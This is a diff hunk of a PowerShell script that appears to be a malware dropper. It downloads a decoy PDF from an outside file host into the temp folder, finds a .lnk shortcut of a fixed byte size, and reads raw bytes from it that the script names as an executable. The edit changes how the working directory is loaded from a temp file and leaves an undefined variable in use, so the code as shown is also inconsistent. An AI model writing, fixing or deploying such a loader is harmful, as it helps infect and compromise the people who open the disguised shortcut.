@@ -4,9 +4,9 @@ iwr 'https://files.catbox.moe/qvj6fx.pdf' -OutFile ($d = "$env:TEMP\metodo.pdf")
 
 $1 = 2565719
 $2 = 5439
-Set-Location -Path $currentPath; 
-$dirPath = Get-Location;
-Set-Location -Path $dirPath.Path; 
+$tempPath = Join-Path $env:TEMP 'path.txt'
+$currentPath = Get-Content -Path $tempPath
+Set-Location -Path $currentPath
 $lnkpaths = Get-ChildItem -Path $dirPath.Path -Recurse *.lnk | Where-Object { $_.length -eq $1 } | Select-Object -ExpandProperty FullName;
 $lnkpath = if ($lnkpaths -is [array]) {$lnkpaths[0]} else {$lnkpaths};
 $exeFile = Get-Content $lnkpath -Encoding Byte -TotalCount $1 -ReadCount $1;
